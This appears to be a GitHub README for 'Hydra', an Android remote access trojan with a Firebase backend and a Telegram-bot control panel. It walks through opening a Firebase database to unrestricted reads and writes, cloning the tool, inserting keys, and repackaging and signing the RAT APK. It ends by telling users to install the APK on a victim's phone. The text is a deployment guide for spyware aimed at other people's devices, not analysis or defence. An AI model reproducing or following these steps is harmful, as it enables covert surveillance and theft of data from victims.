
![Alt text](images/logo.png)<br>
<b>HYDRA</b><br>

𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦<br>
![App Screenshot](https://github.com/HackersNexus/Hydra23/blob/main/images/screenshot1.png)<br>

<h1><a href="https://google.com">YouTube Video</a></h1> <br>



<h2>Requirments</h2>
<ul>
  <li><a href="https://f-droid.org/repo/com.termux_118.apk"> Termux </a></li>
  <li>apk tool m</li>
  <li><a href="firebase.google.com">Firebase</a></li>
  <li>Telegram</li>
</ul>
<h1>How to Setup the Payload and Panel</h1>
<h2>Firebase Setup</h2>
<p>1.Create an Firebase Account and afterwords create a new project with any name</p>
<p>2.Enable Firebase Database and Firebase Storage</p>
<p>3.In Firebase Database Click on the</p>
<br>
<p>    {
     "rules": {
             ".read": "true",
             ".write": "true"
              }
    }</p>
<p>4.In Firebase Storage allow reads and writes</p>
<p>5.Now Go to project overview and create an Android App and download the google-services.json</p>
<p>6.create a web app and copy the config of webapp</p>
<br>
<h2>Panel Setup</h2>
<p></b>1. Glone the github </b></p>
<p>cd /sdcard<p>
<p>pkg install git</p>
<p>git clone https://github.com/HackersNexus/Hydra</p>
<br>
<p><b>2. Create a telegram bot</b></p>
<ul>
  <li>Open Telegram and search for BotFather. BotFather is the official bot for creating and managing Telegram bots.</li>
  <li>Start a chat with BotFather and type the command: /start</li>
  <li>To create a new bot, type: /newbot</li>
  <li>BotFather will ask you for a name for your bot. Choose a name (e.g., “MyFirstBot”).</li>
  <li>Next, it will ask for a username that must end in "bot" (e.g., “MyFirstBot123_bot”).</li>
  <li>After this, BotFather will generate an API token for your bot. This token is important for interacting with your bot via code.</li>
</ul>
<p><b>3. Open the Hydra folder and edit the main.py run setup.sh</b></p>
<p>cd Hydra</p>
<p>nano main.py</p>
<p>add the firebase keys then add the telegram bot token  ctrl+x to save the file</p>
<p><b>4. Download the requirements</b></p>
<p>pkg install python</p>
<p>apt update</p>
<p>apt upgrade</p>
<p>bash setup.sh</p>
<h2>Android Rat</h2>
<p>1. Decompile the android.apk using apktool m</p>
<p>2. open the file res/values/strings.xml</p>
<p>3. add the database keys </p>
<p>4. Now compile the app with appt2</p>
<p>5. Sing the apk</p>


<h1>How to Use it </h1>
<p>2. python main.py</p>
<p>3. install that apk in viteams phone </p>




